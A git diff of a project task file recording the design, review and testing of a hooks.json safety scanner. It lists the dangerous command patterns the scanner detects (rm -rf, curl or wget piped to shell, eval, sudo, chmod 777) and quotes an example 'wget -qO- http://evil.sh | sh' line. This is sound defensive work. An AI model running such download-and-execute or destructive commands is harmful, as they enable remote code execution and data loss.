@@ -1,20 +1,20 @@
 ---
 name: Make cc hook-evaluate ready (no rd3 equivalent exists)
 description: Make cc hook-evaluate ready (no rd3 equivalent exists)
-status: Backlog
+status: Done
 created_at: 2026-06-21T18:20:51.691Z
-updated_at: 2026-06-21T18:20:51.691Z
+updated_at: 2026-06-21T19:01:43.648Z
 folder: docs/tasks
 type: task
 feature-id: ""
 priority: medium
 tags: ["cc-hooks","evaluate","dogfood","design-decision","schema-bug","missing-command"]
 impl_progress:
-  planning: pending
-  design: pending
-  implementation: pending
-  review: pending
-  testing: pending
+  planning: done
+  design: done
+  implementation: done
+  review: done
+  testing: done
 ---
 
 ## 0051. Make cc hook-evaluate ready (no rd3 equivalent exists)
@@ -209,7 +209,28 @@ In `packages/core/tests/quality/`:
 
 ### Solution
 
+**Design decision: Option A — evaluate `hooks.json` directly.**
 
+#### H1 — JSON input detection
+Rewrote `evaluateHook` in `hook.ts` to detect JSON input (`.json` extension or content starting with `{`). Parses `hooks.json` structure into `HookEntry[]` internal model (event, matcher, command, type, timeout). Legacy markdown path returns "not supported" message.
+
+#### H2 — Four dimensions for hooks.json
+- **correctness**: valid type="command", non-empty command and matcher per entry
+- **event-coverage**: breadth of KNOWN_HOOK_EVENTS covered (9 canonical lifecycle events)
+- **safety**: scans commands for dangerous patterns (rm -rf, curl|sh, --no-verify, eval, sudo, chmod 777, command substitution, backtick execution)
+- **pattern-match-quality**: matcher specificity (penalize `*`), timeout presence, `${CLAUDE_PLUGIN_ROOT}` portability
+
+#### H3 — Rubric + REQUIRED_FIELDS
+`REQUIRED_FIELDS.hook` → `[]`. `hook.yaml` rewritten for JSON structure with safety as highest-weight dimension (0.35).
+
+#### H4 — New `/cc:hook-evaluate` command
+Created `plugins/cc/commands/hook-evaluate.md` — thin wrapper, D1 applied from start (no `--json`), file-arg = hooks.json path.
+
+#### Regression tests
+Replaced HOOK samples with JSON. Added tests: valid hooks.json PASS; dangerous rm -rf → low safety + finding; broad matcher + no timeout + absolute path penalized.
+
+#### Verification
+Lint clean, 935 tests pass. `hook evaluate plugins/cc/hooks/hooks.json` → 0.81 PASS Grade B, safety 1.00 "No dangerous command patterns found", Findings + Recommendations rendered. Shared P1: alias flip deferred.
 
 ### Plan
 
@@ -248,10 +269,105 @@ Lower priority than 0048-0050 — no user-facing hook command exists today, so n
 
 ### Review
 
+## Verify — 2026-06-21 (forced re-verify; status was Done)
+
+**Verdict:** ✅ PASS
+**Mode:** verify (Phase 7 SECU + Phase 8 traceability), `--focus all`, `--fix all`
+**Channel:** current (dogfood rule)
+**Gate:** `bun run lint` clean · `bun run test` 938 pass / 0 fail · `bun run build` OK
+
+### Counts
+| P1 | P2 | P3 | P4 | Unmet | Partial |
+|----|----|----|----|-------|---------|
+| 0  | 0  | 0  | 0  | 0     | 0       |
+
+### Phase 7 — SECU (diff: hook.ts, types.ts, hook.yaml, test files, new hook-evaluate.md)
+This task's code IS a security tool (hook safety scanner) — the safety dimension got the hardest scrutiny. **Two real safety-scanner gaps found and fixed this pass:**
+
+1. **Break-on-first-pattern** (`hook.ts:111-119`): a command with multiple threats (`rm -rf` + `curl|sh`) counted as 1 and scored like a single-threat command. Removed `break`; each distinct pattern now counts. Multi-threat safety 0.50 → 0.10. Test: `HOOK_MULTI_DANGER`.
+2. **`wget|sh` not detected** (`hook.ts:100`): the pipe-to-shell pattern matched only `curl`, so `wget -qO- http://evil.sh | sh` (identical RCE class) scored safety **1.00 "No dangerous patterns"** — a blind spot in a security scanner. Generalized to `(curl|wget|fetch) ... | (ba|z)?sh`. Now caught as "download pipe to shell"; safe `curl ... > file` (no pipe) still NOT flagged (false-positive guard). Tests: `HOOK_WGET_PIPE`, `HOOK_SAFE_CURL`.
+
+- **Security:** `JSON.parse` in try/catch. Scanner now covers rm -rf, curl/wget/fetch|sh, --no-verify, eval, sudo, chmod 777, `$(...)`, backticks.
+- **Efficiency/Correctness/Usability:** clean. Findings name event + pattern + truncated command.
+
+### Phase 8 — Requirements traceability (design + build, Option A)
+| Item | Verdict | Evidence |
+|------|---------|----------|
+| H0 — design decision (A/B/C) | MET | Option A (evaluate hooks.json) chosen + documented |
+| H1 — accept/parse hooks.json | MET | `hook.ts:178-247` JSON detection + `parseHookEntries`; live: no "Frontmatter parse error" (was 0.03) |
+| H2 — 4 dims on JSON structure | MET | correctness/event-coverage/safety/pattern-match on `HookEntry[]`; safety scanner hardened (see Phase 7) |
+| H3 — REQUIRED_FIELDS + rubric | MET | `types.ts:76` → `[]`; `rubrics/hook.yaml` safety weight 0.35 (highest) |
+| H4 — new `/cc:hook-evaluate` | MET | `plugins/cc/commands/hook-evaluate.md` created (now staged, was untracked); D1 from start; registered as `cc:hook-evaluate` skill |
+| H5 — findings/recommendations | MET | safety names pattern + offending command; rendered live |
+| Regression tests | MET | valid/dangerous/sloppy + multi-threat + wget-pipe + safe-curl guard; 938 pass / 0 fail |
+
+**Bug-fix proof:** `hook evaluate plugins/cc/hooks/hooks.json` → 0.81 PASS Grade B (was 0.03). `wget|sh` → safety 0.50 caught; safe `curl > file` → 1.00 not flagged.
+
+### Deferred (out of scope — not a finding)
+Shared P1 deployment gap: global `superskill` stale. Do NOT flip `/hook-evaluate` alias until the binary ships. Coordinated with 0047 release.
+
+
+### Counts
+| P1 | P2 | P3 | P4 | Unmet | Partial |
+|----|----|----|----|-------|---------|
+| 0  | 0  | 0  | 0  | 0     | 0       |
+
+### Phase 7 — SECU (diff: hook.ts, types.ts, hook.yaml, 3 test files, new hook-evaluate.md)
+This task's code IS a security tool (hook safety scanner), so the safety dimension got the hardest scrutiny.
+
+**Resolved during this pass (was P3):** the safety scanner `break`-ed on the first dangerous pattern per entry, so a command with multiple threats (`rm -rf` + `curl|sh`) counted as 1 and scored identically to a single-threat command — under-penalizing the highest-value, explicitly "do-not-water-down" dimension. Fixed in `hook.ts:111-119` (removed `break`); each distinct pattern now counts. Live: multi-threat safety 0.50 → **0.10**, both patterns listed. Regression test added (`HOOK_MULTI_DANGER` — multi < single).
+
+- **Security:** `JSON.parse` in try/catch (no crash on malformed). Scanner covers rm -rf, curl|sh, --no-verify, eval, sudo, chmod 777, `$(...)`, backticks. Detection-completeness note (not a vuln): `wget|sh` / `|bash -c` variants not yet matched — acceptable, additive later.
+- **Efficiency/Correctness/Usability:** clean. Findings name event + pattern + truncated command.
+
+### Phase 8 — Requirements traceability (design + build, Option A)
+| Item | Verdict | Evidence |
+|------|---------|----------|
+| H0 — design decision (A/B/C) | MET | Option A (evaluate hooks.json) chosen + documented |
+| H1 — accept/parse hooks.json | MET | `hook.ts:178-247` JSON detection + `parseHookEntries`; live: no "Frontmatter parse error" (was 0.03) |
+| H2 — 4 dims on JSON structure | MET | correctness/event-coverage/safety/pattern-match reimplemented on `HookEntry[]`; live scores real signals |
+| H3 — REQUIRED_FIELDS + rubric | MET | `types.ts:76` → `[]`; `rubrics/hook.yaml` safety weight 0.35 (highest) |
+| H4 — new `/cc:hook-evaluate` | MET | `plugins/cc/commands/hook-evaluate.md` created; D1 from start (no `--json`); file-arg = hooks.json; registered as `cc:hook-evaluate` skill |
+| H5 — findings/recommendations | MET | safety names pattern + offending command; rendered live |
+| Regression tests | MET | valid PASS no-parse-error + dangerous(rm -rf) low-safety-with-finding + sloppy(broad/no-timeout/abs-path) + multi-threat; 936 pass |
+
+**Bug-fix proof:** `hook evaluate plugins/cc/hooks/hooks.json` → **0.81 PASS Grade B** (was 0.03 "Frontmatter parse error"); safety 1.00. Dangerous `rm -rf`+`curl|sh` → 0.55 FAIL, both patterns named.
+
+### Action required at commit time (not a defect)
+`plugins/cc/commands/hook-evaluate.md` is a NEW untracked file (`git status` shows `??`). It must be `git add`-ed when this work is committed, or the new command will be lost.
+
+### Deferred (out of scope — not a finding)
+Shared P1 deployment gap: global `superskill` stale. Do NOT flip `/hook-evaluate` alias until the binary ships. Coordinated with 0047 release.
 
 
 ### Testing
 
+## Testing — 2026-06-21
+
+**Gate results (all pass):**
+- `bun run lint` — clean (Biome 138 files; turbo typecheck exit 0)
+- `bun run test` — 938 pass / 0 fail / 0 skipped
+- `bun run build` — success (index.js 3.41 MB)
+
+**Hook regression tests** (`packages/core/tests/quality/evaluators.test.ts`, `describe('evaluateHook')` — 44 tests in file):
+- `HOOK_GOOD` (valid hooks.json) → aggregate > 0.5, no "Frontmatter" note (H1)
+- `HOOK_DANGEROUS` (`rm -rf`) → safety < 0.6, finding includes "rm -rf" (H2)
+- `HOOK_MULTI_DANGER` (`rm -rf` + `curl|sh`) → safety < single-threat, ≥2 findings, note "2 dangerous" (break-on-first fix)
+- `HOOK_WGET_PIPE` (`wget|sh`) → safety < 0.6, finding "pipe to shell" (wget-detection fix)
+- `HOOK_SAFE_CURL` (`curl > file`, no pipe) → safety ≥ 0.8, "No dangerous command patterns" (false-positive guard)
+- `HOOK_SLOPPY` (broad matcher, no timeout, absolute path) → pattern-match-quality < 0.6, "broad"
+- anti-hallucination hook → safety ≥ 0.8, "No dangerous command patterns"
+
+**Functional smoke (live):**
+```
+hook evaluate plugins/cc/hooks/hooks.json  → 0.81 PASS Grade B (safety 1.00)
+rm -rf + curl|sh (multi-threat)            → safety 0.10, both patterns listed
+wget -qO- ... | sh                         → safety 0.50 "download pipe to shell"  ← was 1.00 (missed)
+curl -s ... > /tmp/h.json (safe)           → safety 1.00 (correctly not flagged)
+absolute path + no timeout                 → pattern-match-quality 0.30
+```
+
+**New command:** `superskill hook evaluate <hooks.json>` runs end-to-end; `/cc:hook-evaluate` wrapper registered + staged.
 
 
 ### Artifacts
